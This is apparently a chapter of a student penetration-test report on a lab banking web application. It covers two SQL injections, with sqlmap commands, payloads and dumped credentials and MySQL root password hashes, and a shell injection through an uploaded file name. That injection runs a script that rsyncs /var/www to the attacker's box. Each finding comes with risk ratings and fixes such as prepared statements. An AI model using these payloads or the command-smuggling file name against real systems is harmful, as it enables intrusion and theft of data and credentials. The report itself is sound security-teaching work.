
\chapter{Injection Attacks}

\section{SQL Injection}

\subsection{Observation}

We discovered that the request \textit{host-ip/sc-course/views/transactions/tan\_entry.php?transaction\_id=x} is vulnerable to SQL Injections.
The attacker has to be logged in as user in order to create a new transaction . After inserting an account number and an amount for the new transaction the above-named request is sent. The user now would have to insert the TAN. At this point the parameter "transaction\_id can be used for all kind SQL injections.


Likelihood: high\newline

Impact:      	high\newline

Risk: high \newline

\subsection{Discovery}
With ZAP Spider, we were searching for GET and POST Requests with Parameters which probably will be inserted into a SQL query.

\subsubsection{GET}
\begin{itemize}
	\item http://<host-ip>/sc-course/views/transactions/user.php?user\_id=2 
	\item http://<host-ip>/sc-course/views/transactions/tan\_entry.php?transaction\_id=18
	
\end{itemize}
 In the context of SQL Injections, we ignore the Get-Requests with the flash parameter, because they're not part of SQL queries.
 The two URLs were tested with \textit{sqlmap}. Although testing the first URL was unsuccessful, the result of the second test in Listing \ref{listing:first_test} showed that the GET-Parameter\textbf{ transaction\_id} is vulnerable to boolean-based blind and time-based blind SQL Injections. Boolean-based blind injections inserting statements into the parameter. By comparing different responses, the tool can infer whether a injection was successful or not.
 Time-based blind injections insert statements which cause the database to pause for a specific time. By comparing different response times, the tool can verify a successful statement
 



\begin{lstlisting}[caption= First Test with result,label=listing:first_test]
sqlmap -u "host-ip/sc-course/views/transactions/tan_entry.php?transaction_id=14"

.....

GET parameter 'transaction_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection points with a total of 202 HTTP(s) requests:
---
Place: GET
Parameter: transaction_id
Type: boolean-based blind
Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)
Payload: transaction_id=14' RLIKE (SELECT (CASE WHEN (6290=6290) THEN 14 ELSE 0x28 END)) AND 'umTL'='umTL

Type: AND/OR time-based blind
Title: MySQL < 5.0.12 AND time-based blind (heavy query)
Payload: transaction_id=14' AND 5296=BENCHMARK(5000000,MD5(0x46744978)) AND 'knKI'='knKI
---
\end{lstlisting}

The next step was to get the name of the database and the tables, as done in Listing \ref{sqlmap-get-tables}

\begin{lstlisting}[caption = Get name and tables of database,label=sqlmap-get-tables]
python sqlmap.py -u "192.168.56.101/sc-course/views/transactions/tan_entry.php?transaction_id=14" --dbs
...
available databases [10]:
[*] banking_development
[*] dvwa
[*] information_schema
[*] mysql
[*] owasp10
[*] performance_schema
[*] phpmyadmin
[*] samurai_dojo_basic
[*] samurai_dojo_scavenger
[*] test


python sqlmap.py -u "192.168.56.101/sc-course/views/transactions/tan_entry.php?transaction_id=14" --tables -D banking_development

Database: banking_development
[5 tables]
+--------------+
| payments     |
| phinxlog     |
| tan_numbers  |
| transactions |
| users        |
+--------------+
\end{lstlisting}

Now you can dump a table, e.g "users"

\begin{lstlisting}[caption= Dump Table "users", label=listing:dump_table]
	python sqlmap.py -u "192.168.56.101/sc-course/views/transactions/tan_entry.php?transaction_id=14" --dump -D banking_development -T users
	...
	[15:14:07] [INFO] retrieved: id
	[15:14:07] [INFO] retrieved: name
	[15:14:08] [INFO] retrieved: password
	[15:14:09] [INFO] retrieved: email
	[15:14:10] [INFO] retrieved: admin
	[15:14:11] [INFO] retrieved: account_no
	...
	[15:14:14] [INFO] retrieved: 1
	[15:14:14] [INFO] retrieved: t.srivishnu@gmail.com
	[15:14:17] [INFO] retrieved: 1
	[15:14:17] [INFO] retrieved: t.srivishnu@gmail.com
	[15:14:19] [INFO] retrieved: 1234567890
	[15:14:20] [INFO] retrieved: 527652613432
	
\end{lstlisting}

As you can see in Listing \ref{listing:dump_table}. you receive a list of the columns of the table. You also get a list of all entries. For this example only the data of the admin were chosen, but you can access every entry.
 \newline
 \newline
A further possibility is to break the authentication of the database by hijacking the password of the database root user.

\begin{lstlisting}[caption=Get password of database root user,label=listing:database_get_password]
	python sqlmap.py -u "192.168.56.101/sc-course/views/transactions/tan_entry.php?transaction_id=14" --users --passwords -D banking_development 
	...
	database management system users [8]:
	[*] ''@'localhost'
	[*] ''@'samurai-wtf'
	[*] 'debian-sys-maint'@'localhost'
	[*] 'phpmyadmin'@'localhost'
	[*] 'root'@'127.0.0.1'
	[*] 'root'@'::1'
	[*] 'root'@'localhost'
	[*] 'root'@'samurai-wtf'
	...
	database management system users password hashes:                                               
	[*]  [1]:
	password hash: NULL
	[*] debian-sys-maint [1]:
	password hash: *3380A3DC27DEAC2CFFE40754FE91863CE3B5E786
	[*] phpmyadmin [1]:
	password hash: *8CE09BF054AFC740BF3C6153310E9A9565E34DE0
	clear-text password: samurai
	[*] root [2]:
	password hash: *7D9A6BEA19329B17998DC4F1130F8E40884A227F
	clear-text password: badass
	password hash: *8CE09BF054AFC740BF3C6153310E9A9565E34DE0
	clear-text password: samurai
	
\end{lstlisting}

With a integrated dictionary-based password cracking tool, you can convert the hashed password to plain text assuming weak passwords (like in our case). Now you can access the adminer web-interface and login as root.

\subsubsection{POST}
\begin{itemize}
	\item http://192.168.56.101/sc-course/controllers/user/login\_process.php (email,password)
	\item http://192.168.56.101/sc-course/controllers/transactions/create\_process.php (transaction[payment][to\_iban],transaction[payment][amount])
	\item http://192.168.56.101/sc-course/controllers/user/registration\_process.php (user[email],user[name],user[password],user[password\_confirmation],user[account\_no],user[employee],user[terms\_and\_conditions])
	\item http://192.168.56.101/sc-course/controllers/user/logout\_process.php (logout)
	
	
\end{itemize}

The List above shows all relevant POST-Request with the corresponding Parameters in brackets. To test this parameters for possible injections, you can have a look at \ref{listing:post}, where the first request is tested.

\begin{lstlisting}[caption=Testing POST parameters for injections,label=listing:post]
sqlmap -u "http://192.168.56.101/sc-course/controllers/user/login_process.php" --data 'email=nobody@in.tum.de&password=anypassword'

\end{lstlisting}
Unfortunately none of the requests is insecure in terms of SQL Injections.

\subsection{Likelihood}
Assuming that the attacker has basic knowledge about SQL Injections and knows how to use \textit{sqlmap}, it's very likely that this vulnerability will be exploited, because a GET parameter is the vulnerable one. It's more likely that an attacker will test a GET instead of POST parameter, because it's easier to detect.


\subsection{Implication}
The vulnerability in combination with \textit{sqlmap} leads to full compromise of all data, stored in the database. The attacker can hijack information about the names of databases, tables, columns of tables and can even dump whole tables.  In our special case, it was even possible to get the users' passwords in plain text, because they weren't hashed. This is a vulnerability itself, described at \url{https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure}
You can also get the name and the password of the root user of the database. This was benefited by a weak password, whereby the plain password could be recovered from the received hash within seconds. This results in full write access to the database for the attacker.


\subsection{Recommendations}
It's highly recommended, that all inputs for SQL queries are sanitized by escaping the ' character.
Another option is to create query objects by using  Prepared Statements.
These objects will automatically sanitized all inputs. For more information, please go to \url{https://www.owasp.org/index.php/SQL\_Injection}

This observation is related to OWASP Top 10-A1-Injections and to OWASP Top 10-A6-Sensitive-Data-Exposure.

\subsection{Comparison with our App}
We avoided SQL Injection by using Prepared Statements. Therefore the user inputs are sanitized and injections like shown above are not possible. To be sure we did the same test as mentioned before without finding any vulnerable parameters.

\section{SQL Injection 2}

\subsection{Observation}

We found a second possibility for a SQL Injection, which in combination with the misconfigured directory listing can lead to database leakage. Furthermore compromise of user, employee and mysql user credentials is possible through the usage of sqlmap.\newline

Likelihood:  medium - high\newline

Impact: high\newline

Risk: high\newline

\subsection{Discovery}

The vulnerable GET parameter was found using ZAP. While spidering through the application ZAP noted that the parameter \emph{id} on the page \emph{display.php} may be vulnerable to SQL Injections. Although fuzzing the parameter with ZAP SQL Injection payloads does not produce any noticable results, we managed to hand-craft a payload that can compromise the bank systems admin credentials. The payload can also be altered to obtain any other data within the database.

\begin{lstlisting}[caption= The vulnerable parameter, label=listing:injection2parameter]
/sc-course/views/transactions/display.php?id=1
\end{lstlisting}


The GET parameter \emph{id} seems to be used in an SQL Select statement. While it is easy to select other data as well through a union statement, the output on the web page does not reflect that additional data. Since only a certain portion of the selected data is displayed on the page, we needed to obtain the other data through other means. Therefore we altered the statement to create a dumpfile of the selected data. Since the webservers configuration allows directory listing it is very easy to access the created file and read out all of the data. The final statement is as follows:

\begin{lstlisting}[caption= Dumping admin credentials to file via Injection, label=listing:injection2statement]
display.php?id=1' UNION SELECT * FROM users INTO DUMPFILE 'adminCredentials' -- "
\end{lstlisting}

This will write the admin credentials to a file. The attacker can place this file into an accessible directory or use the shell injection vulnerability (presented in the following section), to upload the file.

\begin{lstlisting}[caption= File Contents, label=listing:injection2statement]
12014-10-26 17:47:2128910000-00-00-00 00:00:001t.srivishnu@gmail.com1234567890t.srivishnu@gmail.com1
\end{lstlisting}
It is not hard to identify the admin user name and password from this information. By altering the select statement it becomes possible to dump the credentials of any known or suspected users. Furthermore it is possible to dump entire tables using the mysql OUTFILE command.

It is also possible to run sqlmap on this parameter, resulting in the same breaches that were found during the first SQL Injection attack in the previous section.
\begin{lstlisting}[caption= Using sqlmap on id parameter in display.php, label=listing:injection2statement]
>C:\Python27\python C:\sqlmap\sqlmap.py -u 192.168.56.102/sc-course/views/transactions/
display.php?id=1 --dump -D banking_development -T users
\end{lstlisting}
\subsection{Likelihood}
The hand-crafted exploit took quite a while to design and requires some knowledge. However, given a vulnerable parameter like the \emph{id} parameter in display.php, an attacker can just use sqlmap to do the work for him. The tool is very effective and can dump the entire database in a few seconds, no skills required.

\subsection{Implication}
The entire database is compromised, along with all user credentials. This includes payment data, TAN numbers, personal details and login credentials. The implications are further amplified by the fact that user passwords are for some reason stored in plain text. No hashing or salting is applied.

\subsection{Recommendations}
It is highly recommended, that all inputs for SQL queries are properly sanitized. The developers should at least have used \emph{mysql\_real\_escape\_string} in addition to single quotes. A better approach would be to create query objects and use prepared statements.
More information can be found at \url{https://www.owasp.org/index.php/SQL\_Injection}

This observation is related to OWASP Top 10-A1-Injections and to OWASP Top 10-A6-Sensitive-Data-Exposure.

\subsection{Comparison with our App}
We avoided SQL Injection by using Prepared Statements. To the best of our knowledge all user inputs are sanitized and injections like shown above are not possible. Furthermore we do not make use of GET parameters. We tried running sqlmap on our application, without finding any vulnerable parameters.

\section{Shell Injection}

\subsection{Observation}

During the vulnerability testing of the batch transaction we discovered a shell injection. When uploading a file, it seems that the original file name the user chose is directly appended to the executable name of the C program and then given to the shell. Due to this we can use the file name to execute other programs, we even managed it to let the file be executed by bash.\newline


Likelihood:  medium - high\newline

Impact: high\newline

Risk: high\newline

\subsection{Discovery}

The discovery was easily found by simply uploading a file called \textit{\&\& sleep 30}. We then noticed that the response of the server is delayed by about 30 seconds. This was reason enough to try some more. We then tried to execute code which will download the \textit{/var/www} directory to our local box. The main problem was that it is not possible to use slashes in Unix file names. That means we can not easily change directories or name the file something like this:

\begin{lstlisting}[caption=File with '/' (does not work), label=listing:not_working_file]
&& rsync /var/www mybox::myshare
\end{lstlisting}

Due to this we wanted to be the uploaded file be interpreted by bash on the host, so we could just write a simple bash script with the following content:

\begin{lstlisting}[caption=Bash Script to Get PHP Code, label=listing:bash_script]
rsync /var/www mybox::myshare
\end{lstlisting}

The problem is, we need to somehow integrate the bash execution in our file name like this:

\begin{lstlisting}[caption=Executing code via bash, label=listing:execute_bash_script]
... && bash script.sh
\end{lstlisting}

That means that we need somehow get to the directory the uploaded file is located, we assumed \textit{/tmp/\$filename}.

So we need to change the directory to \textit{/tmp/}. We archived that to create a temporary directory, change to it, and then change to the upper directory like illustrated in Listing \ref{listing:change_to_tmp}. We had to do that because we cannot use slashes in the file name.

\begin{lstlisting}[caption=Change to \textit{/tmp/}, label=listing:change_to_tmp]
&& dir=`mktemp` && cd dir && cd .. 
\end{lstlisting}

Now we are in the directory were our shell script was uploaded. Now we have to execute it. Unfortunately this is pretty hard, because we cannot simply reference the script via the file name, because the file name is also the command we want to inject and we would then get into some recursive loop specifying the hole file name. The solution is to rename the file to some easier name like\textit{script.sh} and then execute it, illustrated in Listing \ref{listing:rename_file}.

\begin{lstlisting}[caption=Rename the file, label=listing:rename_file]
 ... && mv *.sh script.sh && bash script.sh
\end{lstlisting}
 
 We are moving the file \textit{*.sh} to script.sh (Our uploaded file ends with \textit{.sh}).
 
 Listing \ref{listing:complete_file_name} shows the complete file name\footnote{The \textit{rm -rf script.sh} is used to delete any script which was uploaded by a former attack, otherwise renaming the file would fail because \textit{script.sh} would already exist.} which we have used to execute our code.
 
\begin{lstlisting}[caption=Complete File Name, label=listing:complete_file_name]
&& dir=`mktemp` && cd dir && cd .. && rm -rf script.sh && mv *.sh script.sh && bash script.sh
\end{lstlisting}

The command sent to the shell by the PHP code would look similar to this:

\begin{lstlisting}[caption=Shell Command executed by PHP, label=listing:shell_comannd]
./cparser && dir=`mktemp` && cd dir && cd .. && rm -rf script.sh && mv *.sh script.sh && bash script.sh
\end{lstlisting}

\subsection{Likelihood}
It took us hours to get this exploit working, but with some basic knowledge of the Unix Shell and Linux this exploit was possible with moderate effort.

\subsection{Implication}
A successful attack makes the server executing any code or program you like. We managed to get the hole PHP source code, where e.g. the database password is stored. It would be also possible to get other files like \textit{/etc/passwd} or execute other malicious code!

\subsection{Recommendations}
The easiest way to fix this issue is to use temporary randomly assigned file names and get rid of the one the user chose (Do not trust the user's input!). Normally this is done automatically by PHP, moving the file to the originally chosen file name by the user is optional but part of most tutorials on the Internet.

\subsection{Comparison with our App}
Our application is always using the temporary name PHP saved the file under. That means the application is not affected by this vulnerability, because we do not care about the user given name of the file.